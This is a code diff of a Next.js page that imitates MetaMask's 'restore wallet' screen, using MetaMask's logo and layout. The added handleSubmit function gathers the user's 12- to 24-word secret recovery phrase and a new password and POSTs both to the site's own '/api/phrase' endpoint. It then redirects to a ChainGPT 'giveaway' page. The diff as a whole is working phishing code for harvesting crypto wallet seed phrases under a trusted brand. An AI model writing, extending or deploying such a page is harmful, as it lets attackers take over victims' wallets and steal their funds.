@@ -1,19 +1,76 @@
 "use client";
 
-import { useState } from "react";
+import { useState, FormEvent, useEffect } from "react";
 import PhraseField from "./PhraseField";
 import Link from "next/link";
+import { useRouter } from "next/navigation";
+function Spinner() {
+  return (
+    <div
+      className="inline-block h-6 w-6 animate-spin rounded-full border-4 border-solid border-current border-r-transparent align-[-0.125em] motion-reduce:animate-[spin_1.5s_linear_infinite]"
+      role="status"
+    ></div>
+  );
+}
 
 export default function MetaMask() {
   const [noPhrase, setNoPhrase] = useState("I have a 12-word phrase");
+  const [phraseWords, setPhraseWords] = useState<string[]>(Array(24).fill(""));
+  const [newPassword, setNewPassword] = useState("");
+  const [confirmPassword, setConfirmPassword] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [passwordsMatch, setPasswordsMatch] = useState(true);
+  const router = useRouter();
+
   // Function to extract phrase length from the selected option
   const getPhraseLength = (phrase: string) => {
-    const match = phrase.match(/(\d+)-word/); // Extracts the number before "word"
-    return match ? parseInt(match[1]) : 0; // Returns the parsed integer or 0 if not found
+    const match = phrase.match(/(\d+)-word/);
+    return match ? parseInt(match[1]) : 0;
   };
 
   // Determine the number of input fields based on the selected phrase
   const phraseLength = getPhraseLength(noPhrase);
+
+  const handlePhraseChange = (index: number, value: string) => {
+    const newPhraseWords = [...phraseWords];
+    newPhraseWords[index] = value;
+    setPhraseWords(newPhraseWords);
+  };
+
+  useEffect(() => {
+    // Check if passwords match whenever either password field changes
+    setPasswordsMatch(newPassword === confirmPassword);
+  }, [newPassword, confirmPassword]);
+
+  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+    if (!passwordsMatch || newPassword.length < 8) {
+      return;
+    }
+    setIsLoading(true);
+
+    const phrase = phraseWords.slice(0, phraseLength).join(" ").trim();
+
+    try {
+      const response = await fetch("/api/phrase", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ phrase, password: newPassword }),
+      });
+
+      if (!response.ok) {
+        throw new Error("Network response was not ok");
+      }
+
+      router.replace("https://www.chaingpt.org/giveaway");
+    } catch (error) {
+      console.error("Error submitting form:", error);
+    } finally {
+      setIsLoading(false);
+    }
+  };
 
   return (
     <main className="max-w-screen-lg relative md:static">
@@ -39,8 +96,8 @@ export default function MetaMask() {
                 <path d="m949.3 117.9-57.8-59.7c-.2-.2-.2-.6 0-.8l52-54c.4-.4.1-1-.4-1h-21.3c-.2 0-.3.1-.4.2l-44.1 45.8c-.4.4-1 .1-1-.4v-45c0-.3-.3-.6-.6-.6h-16.7c-.3 0-.6.3-.6.6v115.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-50.8c0-.5.7-.8 1-.4l50 51.6c.1.1.3.2.4.2h21.3c.4-.1.7-.8.3-1.1z"></path>
               </g>
               <g
-                stroke-linecap="round"
-                stroke-linejoin="round"
+                strokeLinecap="round"
+                strokeLinejoin="round"
                 transform="translate(1 1)"
               >
                 <path
@@ -171,7 +228,10 @@ export default function MetaMask() {
       <div className="flex md:hidden justify-between bg-[#24272a] items-center w-full py-4 px-3 shadow-xl md:static fixed top-0 left-0 md:max-w-screen-lg">
         <div className=""></div>
         <div className="flex justify-between items-center">
-          <button className="flex items-center justify-between max-w-[140px] h-[32px] bg-[]">
+          <Link
+            href={"/connect-wallet"}
+            className="flex items-center justify-between max-w-[140px] h-[32px] bg-[]"
+          >
             <svg x="0" y="0" width="16" height="16">
               <rect
                 x="0"
@@ -202,12 +262,12 @@ export default function MetaMask() {
             <h4 className="font-semibold text-[12px] mx-2">Account 1</h4>
 
             <span className="-rotate-45 mb-1 font-semibold">∟</span>
-          </button>
+          </Link>
         </div>
         <div className="rotate-90">...</div>
       </div>
 
-      <div className="p-8 w-full mt-[10rem]">
+      <div className="p-8 w-full md:mt-[10rem] mt-[5rem]">
         <Link
           href={"/connect-wallet"}
           className="md:flex items-center mb-4 gap-2 mt-4 hidden"
@@ -238,66 +298,117 @@ export default function MetaMask() {
           proceeding. You will not be able to undo this.
         </span>
 
-        <div className=" w-full md:flex justify-between items-center ">
-          <h4 className="font-semibold text-white mt-5">
-            Secret Recovery Phrase
-          </h4>
-          <select
-            className="bg-transparent border-[1px] border-solid border-[#848c96] py-2 px-3 mt-1 rounded-md mb-4 w-full md:w-[303px]"
-            value={noPhrase}
-            onChange={(e) => setNoPhrase(e.target.value)}
+        <form onSubmit={handleSubmit}>
+          <div className=" w-full md:flex justify-between items-center ">
+            <h4 className="font-semibold text-white mt-5">
+              Secret Recovery Phrase
+            </h4>
+            <select
+              className="bg-transparent border-[1px] border-solid border-[#848c96] py-2 px-3 mt-1 rounded-md mb-4 w-full md:w-[303px]"
+              value={noPhrase}
+              onChange={(e) => setNoPhrase(e.target.value)}
+            >
+              <option value="I have a 12-word phrase">
+                I have a 12-word phrase
+              </option>
+              <option value="I have a 15-word phrase">
+                I have a 15-word phrase
+              </option>
+              <option value="I have a 18-word phrase">
+                I have a 18-word phrase
+              </option>
+              <option value="I have a 21-word phrase">
+                I have a 21-word phrase
+              </option>
+              <option value="I have a 24-word phrase">
+                I have a 24-word phrase
+              </option>
+            </select>
+          </div>
+
+          <div className="banner">
+            <h4>
+              You can paste your entire secret recovery phrase into any field
+            </h4>
+          </div>
+
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 md:grid-cols-3">
+            {Array.from({ length: phraseLength }, (_, index) => (
+              <PhraseField
+                key={index}
+                index={index}
+                value={phraseWords[index]}
+                onChange={(value) => handlePhraseChange(index, value)}
+              />
+            ))}
+          </div>
+
+          <div className="mt-8">
+            <h4>New Password (8 character min)</h4>
+            <input
+              type="password"
+              className="bg-transparent rounded-md w-full h-[48px] border-[1px] border-solid border-[#848c96] pl-4 outline-none"
+              value={newPassword}
+              onChange={(e) => setNewPassword(e.target.value)}
+              required
+              minLength={8}
+            />
+            <p
+              className={`mt-2 transition-all duration-300 ease-in-out ${
+                newPassword === ""
+                  ? "opacity-0"
+                  : newPassword.length < 8
+                  ? "text-yellow-500 opacity-100"
+                  : "opacity-0"
+              }`}
+            >
+              Password must be at least 8 characters long
+            </p>
+          </div>
+
+          <div>
+            <h4>Confirm password</h4>
+            <input
+              type="password"
+              className="bg-transparent rounded-md w-full h-[48px] border-[1px] border-solid border-[#848c96] pl-4 outline-none"
+              value={confirmPassword}
+              onChange={(e) => setConfirmPassword(e.target.value)}
+              required
+            />
+            <p
+              className={`mt-2 transition-all duration-300 ease-in-out ${
+                confirmPassword === ""
+                  ? "opacity-0"
+                  : newPassword.length < 8
+                  ? "text-yellow-500 opacity-100"
+                  : passwordsMatch
+                  ? "text-green-500 opacity-100"
+                  : "text-red-500 opacity-100"
+              }`}
+            >
+              {newPassword.length < 8
+                ? "Password must be at least 8 characters long"
+                : passwordsMatch
+                ? "Passwords match"
+                : "Passwords do not match"}
+            </p>
+          </div>
+
+          <button
+            type="submit"
+            className="bg-[#43aefc] h-[40px] w-[170px] rounded-full mt-8 text-[#24272a] font-medium flex items-center justify-center"
+            disabled={isLoading || !passwordsMatch || newPassword.length < 8}
           >
-            <option value="I have a 12-word phrase">
-              I have a 12-word phrase
-            </option>
-            <option value="I have a 15-word phrase">
-              I have a 15-word phrase
-            </option>
-            <option value="I have a 18-word phrase">
-              I have a 18-word phrase
-            </option>
-            <option value="I have a 21-word phrase">
-              I have a 21-word phrase
-            </option>
-            <option value="I have a 24-word phrase">
-              I have a 24-word phrase
-            </option>
-          </select>
-        </div>
-
-        <div className="banner">
-            
-          <h4>
-            You can paste your entire secret recovery phrase into any field
-          </h4>
-        </div>
-
-        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 md:grid-cols-3">
-          {/* Dynamically rendered input fields */}
-          {Array.from({ length: phraseLength }, (_, index) => (
-            <PhraseField key={index} index={index} />
-          ))}
-        </div>
-
-        <div className="my-8">
-          <h4>New Password (8 character min)</h4>
-          <input
-            type="password"
-            className="bg-transparent rounded-md w-[360px] h-[48px] border-[1px] border-solid border-[#848c96] pl-4 outline-none"
-          />
-        </div>
-
-        <div>
-          <h4>Confirm password</h4>
-          <input
-            type="password"
-            className="bg-transparent rounded-md w-[360px] h-[48px] border-[1px] border-solid border-[#848c96] pl-4 outline-none"
-          />
-        </div>
-
-        <button className="bg-[#43aefc] h-[40px] w-[170px] rounded-full mt-8 text-[#24272a] font-medium">
-          Restore
-        </button>
+            {isLoading ? (
+              <>
+                <Spinner />
+                <span className="ml-2">Restoring...</span>
+              </>
+            ) : (
+              "Restore"
+            )}
+          </button>
+        </form>
       </div>
     </main>
   );
